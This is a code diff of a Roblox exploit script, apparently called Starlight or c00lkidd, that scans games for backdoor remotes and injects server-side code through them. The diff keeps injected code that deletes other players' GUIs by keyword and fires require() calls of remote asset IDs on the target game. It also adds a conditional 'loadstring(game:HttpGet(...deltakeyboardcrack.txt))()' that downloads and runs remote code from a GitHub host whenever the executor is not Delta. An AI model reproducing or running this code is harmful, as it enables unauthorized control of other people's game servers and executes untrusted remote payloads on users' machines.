@@ -2379,6 +2379,9 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if parent.Parent.Name=='HDAdminHDClient' and remote.Parent.Name=='Signals' then
 			return false
 		end
+		if parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
+			return false
+		end
 		if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
 			return false
 		end
@@ -2394,7 +2397,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	if foundExploit then return false end
 	if not isLikelyBackdoorRemote(remote) then return false end
 
-	local modelName = "starlight_" .. tostring(os.clock()):gsub("%.", "")
+	local modelName = "TCJT_" .. tostring(os.clock()):gsub("%.", "")
 	local rs = game:GetService("ReplicatedStorage")
 	local foundEvent = false
 	local testFlagName = "__backdoor_test_flag_" .. tostring(os.clock()):gsub("%.", "")
@@ -2564,8 +2567,7 @@ local function fireRemoteEvent(code)
     if not foundExploit then
         notify.Warn("c00lkidd", "Inject first - or no backdoor")
     elseif not success then
-        notify.Error("c00lkidd", "Failed to execute!")
-        notify.Warn("fireRemoteEvent errors:")
+        notify.Warn("c00lkidd", "fireRemoteEvent errors:")
         for _, err in ipairs(errors) do
             notify.Error(err)
           end
@@ -2719,11 +2721,17 @@ local function fireRemoteEvent(code)
 			script.Parent.Framee.Log.Text = "[" .. ((remoteEvent and remoteEvent.Name) or (remoteFunction and remoteFunction.Name) or "Unknown") .. "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
 			notify.Info("Backdoor Found!","Scan time : " .. scanTime)
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt"))()
-	                fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={[' .. game.Players.LocalPlayer.Name .. ']=true,["raizarit"]=true,["greguiscool"]=true,["raizarit6"]=true}local function isSuspicious(str)if not str then return false end str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local character=p.Parent return Players:GetPlayerFromCharacter(character)or Players:FindFirstChild(character.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local nameStr=i.Name local textStr=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(nameStr)or isSuspicious(textStr)then local hint=Instance.new("Hint",workspace)hint.Text="[Skid] Deleted suspicious GUI: "..nameStr..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)") task.delay(3,function()if hint and hint.Parent then hint:Destroy()end end) local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then f:Destroy() else i:Destroy() end end end end for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end game.DescendantAdded:Connect(function(obj) pcall(deleteIfSuspicious,obj) end)task.spawn(function() while true do for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end task.wait(5)end end)')
+                        -----------
+			fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={[' .. game.Players.LocalPlayer.Name .. ']=true,["raizarit"]=true,["greguiscool"]=true,["raizarit6"]=true}local function isSuspicious(str)if not str then return false end str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local character=p.Parent return Players:GetPlayerFromCharacter(character)or Players:FindFirstChild(character.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local nameStr=i.Name local textStr=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(nameStr)or isSuspicious(textStr)then local hint=Instance.new("Hint",workspace)hint.Text="[Skid] Deleted suspicious GUI: "..nameStr..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)") task.delay(3,function()if hint and hint.Parent then hint:Destroy()end end) local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then f:Destroy() else i:Destroy() end end end end for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end game.DescendantAdded:Connect(function(obj) pcall(deleteIfSuspicious,obj) end)task.spawn(function() while true do for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end task.wait(5)end end)')
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 		        fireRemoteEvent('require(7458325257).antiban()')
                         fireRemoteEvent('require(3986243232).load("Guys i am skid im happy to announce!",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+			local executor = identifyexecutor()
+			 if executor == "Delta" then 
+		             return
+			 else
+			   loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt"))()
+			end            
 	    else
 			script.Parent.Framee.Check.Text = "No backdoor :("
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
